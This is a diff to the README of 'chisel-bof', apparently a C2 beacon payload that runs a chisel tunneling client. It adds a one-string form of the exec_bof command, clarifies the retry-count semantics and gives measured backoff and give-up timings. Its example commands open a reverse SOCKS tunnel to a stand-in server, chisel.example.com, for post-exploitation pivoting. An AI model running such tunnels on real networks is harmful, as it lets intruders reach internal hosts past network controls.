@@ -13,8 +13,8 @@ the official 1.12.0 binary, both directly and behind a public TLS front-end (see
 Nothing binary is committed here: `build.bat` builds everything from source, including the
 crypto static library (hash-verified fetch of Mbed TLS 3.6.7). The prebuilt payload lives on
 the **[latest release](https://github.com/ctrgrb/chisel-bof/releases/latest)** — currently
-`v1.12.1-bof`, asset `chiselbof.dll`, 21,402,112 bytes,
-`sha256 a0fb0ee93ac07e7d5a1a6cedef0f6b856bdaeba8c906fb4fd9fc8fd717138abb` (also in the
+`v1.12.1-bof`, asset `chiselbof.dll`, 21,402,624 bytes,
+`sha256 4787659e9a2e434646d035d06800cbbc9ead916b9acd24d976e754c401f4dbba` (also in the
 `SHA256SUMS.txt` asset). Your own rebuild will **not** hash-match it: the PE timestamp and
 the absolute `__FILE__` paths that Mbed TLS's debug build embeds depend on where the
 dependency was unpacked. Check the shape instead — imports `ws2_32.dll` (13 winsock names) +
@@ -115,6 +115,17 @@ own option parser, so a dashed flag can never reach the packed argument buffer t
 exec_bof zzzzzz https://chisel.example.com R:1080:socks auth ops:pass keepalive 30s ping-timeout 10s
 ```
 
+**Or pass the whole command line as ONE argument**, and dashes are legal again — because then the
+payload, not the C2, splits it (on blanks; `"` groups a value that contains a space):
+
+```
+exec_bof z "https://chisel.example.com R:1080:socks --auth ops:pass --keepalive 30s --max-retry-count 5"
+```
+
+That form needs no counting of `z`s and no renaming of flags; whatever `chisel client` line works
+upstream fits in one string. It is reachable only when the buffer holds exactly one record, so it
+cannot be confused with the record form (which always needs at least a URL and a remote).
+
 | flag | default | what it does (upstream equivalent) |
 |---|---|---|
 | `--auth <user>:<pass>` | none | Authenticates to the server. Split at the **first** colon, so the password may contain colons. This is chisel's SSH-level auth: the payload sends `USERAUTH_REQUEST` method `password` (after a `none` probe) and the server checks it in `PasswordCallback` (`server/server.go:authUser`), which is also how `--authfile` per-user address allow-lists are keyed. A rejected credential ends the session and the client retries with backoff — the server logs `Login failed for user "<name>"`. |
@@ -125,13 +136,31 @@ exec_bof zzzzzz https://chisel.example.com R:1080:socks auth ops:pass keepalive 
 | `--ssh-timeout <dur>` | `30s` | Deadline for the SSH handshake, userauth and the `config` request (chisel's `SSH_TIMEOUT`). |
 | `--min-retry-interval <dur>` | `1s` | Lower bound of the reconnect backoff (`--min-retry-interval`). |
 | `--max-retry-interval <dur>` | `5m` | Upper bound of the reconnect backoff (`--max-retry-interval`). |
-| `--max-retry-count <n>` | unlimited | Give up (return to the beacon) after `n` failed attempts. `-1` or `0`-or-more semantics as chisel: a negative value means unlimited. Attempts are counted per failed session and **reset once a connection has stayed up for more than 5 s** (chisel's `connected` rule), so a long-lived proxy never accumulates a budget that eventually kills it. |
+| `--max-retry-count <n>` | unlimited | Give up (return to the beacon) after `n` failed attempts. `0` and any negative value mean **unlimited**, exactly like chisel, whose gate is `MaxRetries > 0` — a `chisel client` line that works upstream transfers unchanged. Attempts are counted per failed session and **reset once a connection has stayed up for more than 5 s** (chisel's `connected` rule), so a long-lived proxy never accumulates a budget that eventually kills it. |
 
 Backoff is chisel's (`jpillora/backoff`, jitter on, factor 2): the wait for attempt *n* is
-uniform in `[min, min·2ⁿ]`, capped at `max-retry-interval`. Measured on this build:
-`1000, 1615, 3421, 6191, 9125, 19609, 28835 ms`. A front-end that answers `502/503/421`
-because the backend behind it restarted is treated as a session death, so the client backs
-off and keeps trying instead of burning a fixed budget.
+uniform in `[min, min·2ⁿ]`, capped at `max-retry-interval`. One measured run on the defaults gave
+`1000, 1726, 3541, 7004, 7233, 2422, 5292 ms` (jittered, so the numbers move run to run); the
+stable part is the envelope and the wall clock: those 7 waits (28 s) plus 8 dial deadlines (8 s
+each) came out at 93 s, which is what the process actually took. A front-end that answers
+`502/503/421` because the backend behind it restarted is treated as a session death, so the client
+backs off and keeps trying instead of burning a fixed budget.
+
+How long "give up and return to the beacon" takes, measured on the test box (walls are the
+whole run: attempts + the backoff waits; `min == max` collapses the jitter band so the numbers
+are repeatable):
+
+| what is wrong | flags on the command line | wall |
+|---|---|---|
+| nothing listening at the port | `max-retry-count 5 min-retry-interval 2s max-retry-interval 2s connect-timeout 1s` | 13 s |
+| same, default dial deadline (8 s) | `max-retry-count 5 min-retry-interval 2s max-retry-interval 2s` | 49 s |
+| front end answers TLS then `502` (backend down) | `max-retry-count 3 min-retry-interval 2s max-retry-interval 2s connect-timeout 3s ws-timeout 3s ssh-timeout 3s` | 4 s |
+| path black-holed mid-handshake (TLS never answers) | `max-retry-count 4 min-retry-interval 1s max-retry-interval 1s connect-timeout 1s ws-timeout 1s ssh-timeout 1s` | 7 s |
+| never give up | `max-retry-count 0` (or omit it) | unlimited |
+
+The second row is why `connect-timeout` matters more than the retry flags: when the path is
+filtered rather than refused, every attempt spends the full dial deadline before the backoff
+wait even starts.
 
 The payload's own knobs, not chisel's: `--port <p>` (server port, if the URL has none),
 `--listen <p>` (socks bind port when the remote spells it without a port; default 1080),
